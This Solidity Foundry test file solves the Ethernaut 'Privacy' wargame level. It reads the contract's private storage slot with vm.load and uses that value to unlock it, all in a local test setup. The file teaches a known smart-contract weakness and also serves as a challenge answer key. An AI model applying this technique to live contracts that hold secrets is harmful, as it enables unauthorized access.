pragma solidity ^0.8.10;

import 'ds-test/test.sol';
import 'forge-std/Vm.sol';

import '../levels/12-Privacy/PrivacyFactory.sol';
import '../core/Ethernaut.sol';

contract PrivacyTest is DSTest {
  //--------------------------------------------------------------------------------
  //                            Setup Game Instance
  //--------------------------------------------------------------------------------

  Vm vm = Vm(address(HEVM_ADDRESS)); // `ds-test` library cheatcodes for testing
  Ethernaut ethernaut;
  address attacker = address(0xdeadbeef);

  function setUp() public {
    ethernaut = new Ethernaut(); // initiate Ethernaut contract instance
    vm.deal(attacker, 10 ether); // fund our attacker contract with 1 ether
  }

  function testPrivacyHack() public {
    //--------------------------------------------------------------------------------
    //                             Setup Level Instance
    //--------------------------------------------------------------------------------
    PrivacyFactory privacyFactory = new PrivacyFactory();
    ethernaut.registerLevel(privacyFactory);
    vm.startPrank(attacker);

    address levelAddress = ethernaut.createLevelInstance(privacyFactory);
    Privacy privacyContract = Privacy(payable(levelAddress));

    //--------------------------------------------------------------------------------
    //                             Start Level Attack
    //--------------------------------------------------------------------------------

    /*
      // 1 slot
      bool public locked = true;
  
      // 1 slot
      uint256 public ID = block.timestamp;
  
      // 1 slot
      uint8 private flattening = 10;
      uint8 private denomination = 255;
      uint16 private awkwardness = uint16(block.timestamp);
      
      // 3 slots (1 slot per element of array cause bytes32)
      bytes32[3] private data;
    */

    bytes32 keySlot = bytes32(uint256(5)); // slot 5
    
    // accessing slots in foundry, we use vm load
    // on live, can we use(?): 
    //   https://coinsbench.com/solidity-layout-and-access-of-storage-variables-simply-explained-1ce964d7c738
    bytes32 storageKey = vm.load(address(privacyContract), keySlot);
    privacyContract.unlock(bytes16(storageKey));

    //--------------------------------------------------------------------------------
    //                                Submit Level
    //--------------------------------------------------------------------------------
    bool challengeCompleted = ethernaut.submitLevelInstance(
      payable(levelAddress)
    );
    vm.stopPrank();
    assert(challengeCompleted);
  }
}

